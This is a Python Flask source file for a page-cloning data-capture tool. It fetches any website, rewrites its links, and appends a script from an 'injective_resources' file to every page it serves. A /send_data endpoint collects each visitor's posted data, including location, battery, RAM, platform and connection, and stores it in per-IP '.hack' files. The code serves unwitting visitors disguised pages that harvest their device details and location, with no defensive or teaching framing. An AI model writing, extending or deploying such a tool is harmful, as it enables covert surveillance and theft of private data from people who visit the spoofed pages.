import logging
from tabulate import tabulate
import datetime
import requests
from flask import Flask, request, send_from_directory
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import base64
from PIL import Image
from io import BytesIO
import os

app = Flask(__name__)

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

def pageSource(url, file=None):
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        source_code = response.text
        soup = BeautifulSoup(source_code, 'html.parser')
        for tag in soup.find_all('link'):
            if 'href' in tag.attrs:
                tag['href'] = urljoin(url, tag['href'])
        for tag in soup.find_all('script'):
            if 'src' in tag.attrs:
                tag['src'] = urljoin(url, tag['src'])
        for tag in soup.find_all('img'):
            if 'src' in tag.attrs:
                tag['src'] = urljoin(url, tag['src'])
        modified_source_code = str(soup)
        if file is not None:
            with open('index.html', 'w', encoding='utf-8') as file:
                file.write(modified_source_code)
        with open('injective_resources/resources.min/scrappingData.html', 'r', encoding='utf-8') as file:
            modified_source_code += file.read()
        return modified_source_code
    except requests.exceptions.Timeout:
        with open('injective_resources/resources.min/scrappingData.html', 'r', encoding='utf-8') as file:
            page_source = file.read()
        return f"{page_source}Timeout while fetching {url}"
    except requests.exceptions.RequestException as e:
        with open('injective_resources/resources.min/scrappingData.html', 'r', encoding='utf-8') as file:
            page_source = file.read()
        return f"{page_source}Error: {e}"

@app.route('/')
def default_page(url="www.google.com"):
    if not url.startswith('http://') and not url.startswith('https://'):
        url = f'https://{url}'
    source_code = pageSource(url)
    source_code = source_code.replace('href="/', f'href="{url}')
    source_code = source_code.replace('src="/', f'src="{url}')
    return f'{source_code}'

@app.route('/<path:filename>')
def pages(filename):
    return send_from_directory('.', f'{filename}')

@app.route('/send_data', methods=['POST'])
def get_data():
    Data = request.form.get('data')
    IP = str(request.remote_addr)
    with open(f'injective_resources/scrapped_data/users[{IP}].hack', 'a') as file:
        file.write(f'{Data}\n')
    RAM = request.form.get("RAM")
    URL = str(request.form.get("URL"))
    appName = str(request.form.get("appName"))
    battery = str(request.form.get("battery"))
    connection = str(request.form.get("connection"))
    dimension = str(request.form.get("dimension"))
    location = str(request.form.get("location"))
    max_touch = request.form.get("max_touch")
    platform = str(request.form.get("platform"))
    data_table = [["IP", "RAM", "APP_NAME", "BATTERY", "CONNECTION", "DIMENSION", "LOCATION", "MAX_TOUCHES", "PLATFORM"],
                  [IP, RAM, appName, battery, connection, dimension, location, max_touch, platform]]
    print(tabulate(data_table, headers="firstrow", tablefmt="pipe", numalign="left", stralign="left"))
    return "Data received and stored successfully."

@app.route('/<url>')
def servePage(url):
    if not url.startswith('http://') and not url.startswith('https://'):
        url = f'https://{url}'
    source_code = pageSource(url)
    source_code = source_code.replace('href="/', f'href="{url}')
    source_code = source_code.replace('src="/', f'src="{url}')
    return f'{source_code}'

if __name__ == '__main__':
    # Run the Flask app in debug mode
    app.run(debug=True,port=80)

    # Using the test client to make a request
    with app.test_client() as client:
        response = client.get('/')
        print(response.data)

